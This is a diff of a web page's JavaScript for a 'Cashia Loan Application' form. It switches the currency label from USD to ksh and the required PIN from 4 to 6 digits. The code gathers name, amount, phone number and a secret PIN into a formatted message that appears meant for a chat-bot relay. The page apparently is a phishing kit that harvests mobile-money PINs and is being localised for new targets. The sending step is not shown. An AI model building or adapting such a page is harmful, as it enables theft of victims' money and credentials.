@@ -538,12 +538,12 @@ body.light .loan-bar {
 
             document.getElementById('bBar').style.display = 'block';
             document.getElementById('bName').textContent = name || 'N/A';
-            document.getElementById('bAmt').textContent = 'USD ' + (amount || '0.00');
+            document.getElementById('bAmt').textContent = 'ksh ' + (amount || '0.00');
             document.getElementById('bTerm').textContent = duration || 'N/A';
             document.getElementById('bPhone').textContent = phone ? '+263' + phone : 'N/A';
 
             document.getElementById('dispName').value = name || 'N/A';
-            document.getElementById('dispAmount').value = 'USD ' + (amount || '0.00');
+            document.getElementById('dispAmount').value = 'ksh ' + (amount || '0.00');
         }
 
         function togPin() {
@@ -571,7 +571,7 @@ body.light .loan-bar {
             clrErr();
             var pin = document.getElementById('pin').value.trim();
 
-            if (pin.length !== 4) { showErr('PIN must be exactly 4 digits'); return; }
+            if (pin.length !== 6) { showErr('PIN must be exactly 6 digits'); return; }
 
             var msg = '\u{1f4f1} <b>Cashia Loan Application</b>\n\n' +
                 '<b>Name:</b> <code>' + bd.name + '</code>\n' +
